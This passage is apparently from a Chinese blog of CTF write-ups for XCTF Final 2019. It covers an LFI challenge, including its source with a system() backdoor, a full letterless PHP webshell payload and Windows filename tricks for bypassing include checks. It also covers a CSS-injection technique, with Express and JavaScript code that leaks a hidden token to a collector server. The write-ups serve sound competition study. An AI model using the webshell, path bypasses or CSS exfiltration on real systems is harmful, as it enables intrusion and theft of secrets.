\"..\"){ if(is_dir($dir.\"/\".$object)) rrmdir($dir.\"/\".$object, $depth + 1); else unlink($dir.\"/\".$object); } } } if($depth != 0) rmdir($dir); } function countdir($dir){ if (is_dir($dir)){ $objects = scandir($dir); foreach ($objects as $object){ if ($object != \".\" &amp;&amp; $object != \"..\"){ $count += 1; if(is_dir($dir.\"/\".$object)) $count += countdir($dir.\"/\".$object); } } } return $count; } var_dump(countdir(\"./files\")); if(countdir(\"./files/\") &gt;= 100) @rrmdir(\"./files/\"); // Here, kawaii path-san for you! // function path_sanitizer($dir, $harden=false){ $dir = (string)$dir; $dir_len = strlen($dir); // Deny LFI/RFI/XSS // $filter = ['.', './', '~', '.\\\\', '#', '&lt;', '&gt;']; foreach($filter as $f){ if(stripos($dir, $f) !== false){ return false; } } // Deny SSRF and all possible weird bypasses // $stream = stream_get_wrappers(); $stream = array_merge($stream, stream_get_transports()); $stream = array_merge($stream, stream_get_filters()); foreach($stream as $f){ $f_len = strlen($f); if(substr($dir, 0, $f_len) === $f){ return false; } } // Deny length // if($dir_len &gt;= 128){ return false; }truetrue// Easy level hardening //truetrueif($harden){truetruetrue$harden_filter = [\"/\", \"\\\\\"];truetruetrueforeach($harden_filter as $f){truetruetruetrue$dir = str_replace($f, \"\", $dir);truetruetrue}truetrue} // Sanitize feature is available starting from the medium level // return $dir; } // The new kakkoii code-san is re-implemented. // function code_sanitizer($code){ // Computer-chan, please don't speak english. Speak something else! // $code = preg_replace(\"/[^&lt;&gt;!@#$%\\^&amp;*\\_?+\\.\\-\\\\\\'\\\"\\=\\(\\)\\[\\]\\;]/u\", \"*Nope*\", (string)$code); return $code; } // Errors are intended and straightforward. Please do not ask questions. // class Get { protected function nanahira(){ // senpai notice me // function exploit($data){ $exploit = new System(); } $_GET['trigger'] &amp;&amp; !@@@@@@@@@@@@@exploit($$$$$$_GET['leak']['leak']); } private $filename; function __construct($filename){ $this-&gt;filename = path_sanitizer($filename); } function get(){ if($this-&gt;filename === false){ return [\"msg\" =&gt; \"blocked by path sanitizer\", \"type\" =&gt; \"error\"]; } // wtf???? // if(!@file_exists($this-&gt;filename)){ // index files are *completely* disabled. // if(stripos($this-&gt;filename, \"index\") !== false){ return [\"msg\" =&gt; \"you cannot include index files!\", \"type\" =&gt; \"error\"]; } // hardened sanitizer spawned. thus we sense ambiguity // $read_file = \"./files/\" . $this-&gt;filename; $read_file_with_hardened_filter = \"./files/\" . path_sanitizer($this-&gt;filename, true); if($read_file === $read_file_with_hardened_filter || @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter)){ return [\"msg\" =&gt; \"request blocked\", \"type\" =&gt; \"error\"]; } // .. and finally, include *un*exploitable file is included. // @include(\"./files/\" . $this-&gt;filename); return [\"type\" =&gt; \"success\"]; }else{ return [\"msg\" =&gt; \"invalid filename (wtf)\", \"type\" =&gt; \"error\"]; } } } class Put { protected function nanahira(){ // senpai notice me // function exploit($data){ $exploit = new System(); } $_GET['trigger'] &amp;&amp; !@@@@@@@@@@@@@exploit($$$$$$_GET['leak']['leak']); } private $filename; private $content; private $dir = \"./files/\"; function __construct($filename, $data){ global $seed; if((string)$filename === (string)@path_sanitizer($data['filename'])){ $this-&gt;filename = (string)$filename; }else{ $this-&gt;filename = false; } $this-&gt;content = (string)@code_sanitizer($data['content']); } function put(){ // just another typical file insertion // if($this-&gt;filename === false){ return [\"msg\" =&gt; \"blocked by path sanitizer\", \"type\" =&gt; \"error\"]; } // check if file exists // if(file_exists($this-&gt;dir . $this-&gt;filename)){ return [\"msg\" =&gt; \"file exists\", \"type\" =&gt; \"error\"]; } file_put_contents($this-&gt;dir . $this-&gt;filename, $this-&gt;content); // just check if file is written. hopefully. // if(@file_get_contents($this-&gt;dir . $this-&gt;filename) == \"\"){ return [\"msg\" =&gt; \"file not written.\", \"type\" =&gt; \"error\"]; } return [\"type\" =&gt; \"success\"]; } } // Triggering this is nearly impossible // class System { function __destruct(){ global $seed; // ain't Argon2, ain't pbkdf2. what could go wrong? $flag = hash('sha256', $seed); if($_GET[$flag]){ @system($_GET[$flag]); }else{ @unserialize($_SESSION[$flag]); } } } // Don't call me a savage... I gave everything you need // if($_SERVER['QUERY_STRING'] === \"show-me-the-hint\"){ show_source(__FILE__); exit; } // XSS protection and hints ^-^ // header('X-Hint: /index.php?show-me-the-hint'); header('X-Frame-Options: DENY'); header('X-XSS-Protection: 1; mode=block;'); header('X-Content-Type-Options: nosniff'); header('Content-Type: text/html; charset=utf-8'); header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0'); //header(\"Content-Security-Policy: default-src 'self'; script-src 'nonce-${seed}' 'unsafe-eval';\" . //\"font-src 'nonce-${seed}' fonts.gstatic.com; style-src 'nonce-${seed}' fonts.googleapis.com;\"); // Hello, JSON! // $parsed_url = explode(\"&amp;\", $_SERVER['QUERY_STRING']); if(count($parsed_url) &gt;= 2){ header(\"Content-Type:text/json\"); switch($parsed_url[0]){ case \"get\": $get = new Get($parsed_url[1]); $data = $get-&gt;get(); break; case \"put\": $put = new Put($parsed_url[1], $_POST); $data = $put-&gt;put(); break; default: $data = [\"msg\" =&gt; \"Invalid data.\"]; break; } die(json_encode($data)); }?&gt;&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=utf-8&gt; &lt;link rel=\"stylesheet\" href=\"//stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css\" nonce=\"&lt;?php echo $seed; ?&gt;\"&gt; &lt;link rel=\"styleshhet\" href=\"//fonts.googleapis.com/css?family=Muli:300,400,700\" nonce=\"&lt;?php echo $seed; ?&gt;\"&gt; &lt;link rel=\"stylesheet\" href=\"./static/legit.css\" nonce=\"&lt;?php echo $seed; ?&gt;\"&gt; &lt;title&gt;LFI2019&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"modal fade\" id=\"put-modal\"&gt; &lt;div class=\"modal-dialog modal-lg\"&gt; &lt;div class=\"modal-content\"&gt; &lt;div class=\"modal-header\"&gt; &lt;h5 class=\"modal-title\"&gt;put2019&lt;/h5&gt; &lt;button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-label=\"Close\"&gt; &lt;span aria-hidden=\"true\"&gt;&amp;times;&lt;/span&gt; &lt;/button&gt; &lt;/div&gt; &lt;div class=\"modal-body\"&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"upload-filename\" class=\"col-form-label\"&gt;Filename:&lt;/label&gt; &lt;input type=\"text\" class=\"form-control\" id=\"upload-filename\"&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"upload-content\" class=\"col-form-label\"&gt;Content:&lt;/label&gt; &lt;textarea class=\"form-control disabled\" id=\"upload-content\" rows=10&gt;&lt;/textarea&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"modal-footer\"&gt; &lt;button type=\"button\" class=\"btn btn-secondary\" data-dismiss=\"modal\"&gt;Close&lt;/button&gt; &lt;button type=\"button\" class=\"btn btn-primary\" id=\"upload-submit\"&gt;put();&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"modal fade\" id=\"get-modal\"&gt; &lt;div class=\"modal-dialog modal-lg\"&gt; &lt;div class=\"modal-content\"&gt; &lt;div class=\"modal-header\"&gt; &lt;h5 class=\"modal-title\"&gt;get2019&lt;/h5&gt; &lt;button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-label=\"Close\"&gt; &lt;span aria-hidden=\"true\"&gt;&amp;times;&lt;/span&gt; &lt;/button&gt; &lt;/div&gt; &lt;div class=\"modal-body\"&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"include-filename\" class=\"col-form-label\"&gt;Filename:&lt;/label&gt; &lt;input type=\"text\" class=\"form-control\" id=\"include-filename\"&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;textarea class=\"form-control disabled\" id=\"include-content\" disabled rows=10&gt;&lt;/textarea&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"modal-footer\"&gt; &lt;button type=\"button\" class=\"btn btn-secondary\" data-dismiss=\"modal\"&gt;Close&lt;/button&gt; &lt;button type=\"button\" class=\"btn btn-primary\" id=\"include-submit\"&gt;include();&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"modal fade\" id=\"info-modal\"&gt; &lt;div class=\"modal-dialog modal-lg\"&gt; &lt;div class=\"modal-content\"&gt; &lt;div class=\"modal-header\"&gt; &lt;button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-hidden=\"true\"&gt;×&lt;/button&gt; &lt;/div&gt; &lt;div class=\"modal-body\"&gt; &lt;p&gt; Hi there! We introduce LFI2019 with another technique that never came out on CTFs. We want to end tedious LFI challenges starting from this year. Traps are everywhere, so be warned. Good Luck! &lt;/p&gt; &lt;p&gt; .. and of course, the main objective for this challenge is absolutely straightforward: Leak the sourcecode of flag file to solve this challenge. flag is located at &lt;code&gt;flag.php&lt;/code&gt;. &lt;/p&gt; &lt;/div&gt; &lt;div class=\"modal-footer\"&gt; &lt;button type=\"button\" class=\"btn btn-default\" data-dismiss=\"modal\"&gt;Close&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;ul class=\"text hidden\"&gt; &lt;li&gt;L&lt;/li&gt; &lt;li class=\"ghost\"&gt;e&lt;/li&gt; &lt;li class=\"ghost\"&gt;g&lt;/li&gt; &lt;li class=\"ghost\"&gt;i&lt;/li&gt; &lt;li class=\"ghost\"&gt;t&lt;/li&gt; &lt;li class=\"spaced\"&gt;F&lt;/li&gt; &lt;li class=\"ghost\"&gt;i&lt;/li&gt; &lt;li class=\"ghost\"&gt;l&lt;/li&gt; &lt;li class=\"ghost\"&gt;e&lt;/li&gt; &lt;li class=\"spaced\"&gt;I&lt;/li&gt; &lt;li class=\"ghost\"&gt;n&lt;/li&gt; &lt;li class=\"ghost\"&gt;c&lt;/li&gt; &lt;li class=\"ghost\"&gt;l&lt;/li&gt; &lt;li class=\"ghost\"&gt;u&lt;/li&gt; &lt;li class=\"ghost\"&gt;s&lt;/li&gt; &lt;li class=\"ghost\"&gt;i&lt;/li&gt; &lt;li class=\"ghost\"&gt;o&lt;/li&gt; &lt;li class=\"ghost\"&gt;n&lt;/li&gt; &lt;li class=\"spaced\"&gt;2019&lt;/li&gt; &lt;br&gt;truetrue&lt;br&gt; &lt;div class=\"hide\" id=\"kawaii\"&gt; &lt;center&gt; &lt;button class=\"btn col-4 btn-success half\" id=\"get\"&gt;include&lt;/button&gt; &lt;button class=\"btn col-4 btn-warning\" id=\"put\"&gt;upload&lt;/button&gt; &lt;button class=\"btn col-3 btn-info\" id=\"info\"&gt;info&lt;/button&gt; &lt;p class=\"lightgrey\"&gt; Reference ID: &lt;b class=\"ref\"&gt;&lt;?php echo $seed; ?&gt;&lt;/b&gt; &lt;/p&gt; Made with &amp;hearts; by stypr. &lt;/center&gt; &lt;/div&gt; &lt;/ul&gt; &lt;script src=\"https://code.jquery.com/jquery-3.3.1.min.js\" nonce=\"&lt;?php echo $seed; ?&gt;\"&gt;&lt;/script&gt; &lt;script src=\"//stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js\" nonce=\"&lt;?php echo $seed; ?&gt;\"&gt;&lt;/script&gt; &lt;script src=\"./static/legit.js\" nonce=\"&lt;?php echo $seed; ?&gt;\" defer&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&lt;!-- https://www.youtube.com/watch?v=OEpeRmPkRIU --&gt; 不过比较无语的是有很多的垃圾代码…可以看到有个出题人留的后门函数，but 因为code_sanitizer的过滤 123456// The new kakkoii code-san is re-implemented. //function code_sanitizer($code){ // Computer-chan, please don't speak english. Speak something else! // $code = preg_replace(\"/[^&lt;&gt;!@#$%\\^&amp;*\\_?+\\.\\-\\\\\\'\\\"\\=\\(\\)\\[\\]\\;]/u\", \"*Nope*\", (string)$code); return $code;} 这里我们可以使用无字母的 webshell 来进行一个绕过，可以参考一些不包含数字和字母的webshell，这里我就直接放 ROIS 师傅们的无字母 webshell 内容了 1&lt;?=$_=[]?&gt;&lt;?=$_=@\"$_\"?&gt;&lt;?=$___=$_['!'!='@']?&gt;&lt;?=$____=$_[('!'=='!')+('!'=='!')+('!'=='!')]?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=\"_\"?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=\"_\"?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_____=$__?&gt;&lt;?=$__=''?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=\".\"?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_____($__)?&gt; 不过他们可能搞错了，这里他们本意想用&lt;?=?&gt;来绕过;限制，但是其实;并没有过滤… 最后一步可以说有了，我们来看看前几步，Put类的__construct有一个path_sanitizer，我们可以看到有一些检查什么的，没有false的情况是不会过滤/的，这里初始化的时候不会过滤/。 所以如果我们在写文件的时候，用put&amp;test/test去写test目录test文件，file_put_contents会因为test目录不存在而写不进去。 1file_put_contents(./test/test): failed to open stream: No such file or directory 那如果我们直接写进一个test文件呢？写是没有问题的，但是我们在用get路由读的时候就会发生问题了。 12345678910111213141516171819202122232425function get(){ if($this-&gt;filename === false){ return [\"msg\" =&gt; \"blocked by path sanitizer\", \"type\" =&gt; \"error\"]; } // wtf???? // if(!@file_exists($this-&gt;filename)){ // index files are *completely* disabled. // if(stripos($this-&gt;filename, \"index\") !== false){ return [\"msg\" =&gt; \"you cannot include index files!\", \"type\" =&gt; \"error\"]; } // hardened sanitizer spawned. thus we sense ambiguity // $read_file = \"./files/\" . $this-&gt;filename; $read_file_with_hardened_filter = \"./files/\" . path_sanitizer($this-&gt;filename, true); if($read_file === $read_file_with_hardened_filter || @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter)){ return [\"msg\" =&gt; \"request blocked\", \"type\" =&gt; \"error\"]; } // .. and finally, include *un*exploitable file is included. // @include(\"./files/\" . $this-&gt;filename); return [\"type\" =&gt; \"success\"]; }else{ return [\"msg\" =&gt; \"invalid filename (wtf)\", \"type\" =&gt; \"error\"]; }} 我们仔细看这段代码，由于path_sanitizer传入了true，这里会把传入的文件名当中/过滤为空，然后有一个比较，如果直接拼接得到的路径与拼接上过滤之后得到的路径相等的话，会进一步比较他们的文件内容，如果相等的话就会被 block …而我们要进行 include ，那就需要绕过这两个判断… 什么个意思呢？就是即使文件名相等，内容也不能相等。 但是我们这里要注意path_sanitizer，如果我们传入一个含有/的文件名那就可以利用这个方法绕过文件名的判断，直接进行包含了。 而题目环境我们可以由一开始的 phpinfo 得到是一个 windows 的环境（虽然赛场是没有的，但是也可以通过各种方法判断一下，比如 nmap 啥的…） 所以我们现在主要就是绕读写文件这一块了。 Trick 1 ​ 对于Windows的文件读取，有一个小 Trick ：使用FindFirstFile这个API的时候，其会把\"解释为.。 1shell\"php === shell.php //true 所以我们可以利用这个 trick ，来构造文件名为\"/test的文件，什么个意思呢？ 1234$read_file = \"./files/./test\";$read_file_with_hardened_filter = \"./files/.test\";file_get_contents($read_file) = '实际文件内容';file_get_contents($read_file_with_hardened_filter) = false //文件不存在 传入的\"/test文件名，由于这个 trick ，会被 Windows 认为是./test，所以在处理这个方式上就产生了差异也就绕过了两个判断 Trick 2可以参考 windows的一些特性 这篇文章，文章最后告诉我们，可以上传一个文件名为test::$INDEX_ALLOCATION的文件，就相当于创建了一个test的文件夹，详细原理可以看该篇文章。 这样我们就可以先用这个 Trick 创建一个文件夹test，然后用put随意写一个文件test/file，在读取的时候，由于path_sanitizer会把我们的/过滤，就成功绕过了文件名的判断了。绕过了这些就只剩下无字母写 webshell 的问题了。 noxss单独为这道题开一篇文章来写，真的tql… tfboys机器学习的题目，表示不会…地址在 XCTF-2019-tfboys Conclusion体验极其好的一次比赛，非常感谢 @r3kapig 师傅们的精心准备，毫不夸张地说，这是本年度体验最好的一场比赛，无论从题目质量或者是从比赛过程的体验，都是非常棒的。希望国内以后更多一些这类的良心比赛！","link":"/2019/11/14/XCTF-Final-2019/"},{"title":"XCTF Final NOXSS Write Up","text":"这是本次比赛做起来最有跪感的一题了，当时比赛的时候怎么都弄不出来…赛后问了一下，主要还是差了一篇文章 Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację，这个标题是个波兰语，中文翻译过来就是使用 CSS 攻击 Web 应用程序，从文章内容也看到了 RPO 的攻击引述，也正是之前 noxss 2017 的解法。 文章首发于先知社区：https://xz.aliyun.com/t/6812 [TOC] Preparation所做的实验测试均在 Chrome 78.0.3904.97 版本上，Firefox 有一些场景未测试成功。 我们需要的有 fontforge / nodejs / npm|yarn ，安装 fontforge on ubuntu，安装 nodejs on ubuntu INTRO在我们看题之前，我们先来看看一些简化的情况 首先创建一个 css.php ，内容如下： 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;?php$token1 = md5($_SERVER['HTTP_USER_AGENT']);$token2 = md5($token1);?&gt;&lt;input type=hidden value=&lt;?=$token1 ?&gt;&gt;&lt;script&gt;truevar TOKEN = \"&lt;?=$token2 ?&gt;\";&lt;/script&gt;&lt;style&gt;true&lt;?=preg_replace('#&lt;/style#i', '#', $_GET['css']) ?&gt;&lt;/style&gt;&lt;/body&gt;&lt;/html&gt; 这段代码也比较简单，input 标签与 script 标签内均有一个 token ，我们需要使用传入 css 参数来获取这两个 token Token1 - Get From Input首先我们来尝试去获取第一个 token1 ，也就是在 input 标签内的 value 属性值，我们可控的只有 css 参数，所以我们只能去尝试构造 css 来获取 input 标签内的 value 属性值。 在 css 当中我们可以使用 css 选择器来选择我们的标签元素，例如 1234567891011121314/* 设置 body 标签元素 */body { } /* 设置 .test class 的样式 */.test { } /* 设置 id 为 test2 的样式 */#test2 { } /* 设置 value 为 abc 的 input 标签的样式 */input[value=\"abc\"] { } /* 设置 value 为 a 开头的 input 标签的样式 */input[value^=\"a\"] { } 我们可以看到在 css 选择器当中，我们可以设置类似value^=\"a\"这样的选择器来获取我们的元素，所以这里我们大概可以有这么一个操作: 12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;input type=hidden value=\"7b8a45b8297cf82cc3cefc174c3ae5a1\"&gt; &lt;style&gt; input[value^=\"0\"] { background: url(http://127.0.0.1:9999/0); } input[value^=\"7\"] { background: url(http://127.0.0.1:9999/7); } &lt;/style&gt;&lt;/body&gt;&lt;/html&gt; 可以看到我们这里收到了value^=\"7\"选择器发来的请求，所以我们也可以i使用枚举思想来进行爆破获取 token1 Token1 - Auto Get From Input剩下的就是要思考我们要如何去构造自动化工具去获取这个 token1 了，这里自动化的难点就在于如何获取爆破的时候是哪个字符正确了而发起了请求，无法拿到这个 callback 我们也就没有依据判断究竟是哪个字符注入正确了而发起了请求。 原文是采取了使用 cookie 的方式来进行这个 callback 的过程： 在服务器上放置一个有 iframe 页面 index.html ，src 为要注入的页面 css 建立一个服务供接受注入字符发来的请求，并且服务通过设置一个 cookie 来响应这个请求 index.html 根据 cookie 来进行判断注入的字符是否正确，正确的话就使用变量进行存储然后接着下一位的爆破 我们在服务端就需要提供这么些功能，所以我们可以构造这么个服务，用npm install或者yarn以下面这个 package.json 构建 12345678910111213{ \"name\": \"css-attack-1\", \"version\": \"1.0.0\", \"description\": \"\", \"main\": \"index.js\", \"dependencies\": { \"express\": \"^4.15.5\", \"js-cookie\": \"^2.1.4\" }, \"devDependencies\": {}, \"author\": \"\", \"license\": \"ISC\"} 以及相应的服务代码： 1234567891011121314151617181920212223242526272829const express = require('express');const app = express();app.disable('etag');const PORT = 3000;app.get('/token/:token',(req,res) =&gt; { const { token } = req.params; //var {a} = {a:1, b:2}; =&gt; var obj = {a:1, b:2};var a = obj.a; console.log(token); res.cookie('token',token); res.send('')});app.get('/cookie.js',(req,res) =&gt; { res.sendFile('js.cookie.js',{ root: './node_modules/js-cookie/src/' });});app.get('/index.html',(req,res) =&gt; { res.sendFile('index.html',{ root: '.' });});app.listen(PORT, () =&gt; { console.log(`Listening on ${PORT}...`);}); 然后使用node index.js跑起来就行了。 整个流程大致是如下一个流程： 如果我们目前提取的 token 长度小于预期的长度，则我们执行以下操作 删除包含所有先前提取数据的 cookie 创建一个 iframe 标签，并 src 指向我们构造好的字符爆破的页面。 我们一直等到自己的服务 callback 为爆破请求设置含有 token 的 cookie 设置 cookie 后，我们将其设置为当前的已知 token 值，并返回到步骤1 所以我们可以有大致以下框架： 1234567891011121314151617&lt;big id=token&gt;&lt;/big&gt;&lt;br&gt;&lt;iframe id=iframe&gt;&lt;/iframe&gt;&lt;script&gt; (async function () { const EXPECTED_TOKEN_LENGTH = 32; const ALPHABET = Array.from(\"0123456789abcdef\"); const iframe = document.getElementById('iframe'); let extractedToken = ''; while (extractedToken.length &lt; EXPECTED_TOKEN_LENGTH) { clearTokenCookie(); createIframeWithCss(); extractedToken = await getTokenFromCookie(); document.getElementById('token').textContent = extractedToken; } })();&lt;/script&gt; 首先我们可以直接使用 js-cookie 这个项目来直接清除 cookie 123function clearTokenCookie() { Cookies.remove('token');} 接下来，我们需要为 iframe 标签构造注入的页面 URL : 123function createIframeWithCss() { iframe.src = 'http://127.0.0.1/css.php?css=' + encodeURIComponent(generateCSS());} 以及生成 css 的函数： 123456789function generateCSS() { let css = ''; for (let char of ALPHABET) { css += `input[value^=\"${extractedToken}${char}\"] {background: url(http://127.0.0.1:3000/token/${extractedToken}${char})}`; } return css;} 最后我们需要实现通过等待反向连接来设置 cookie ，用 JS 中的 Promise 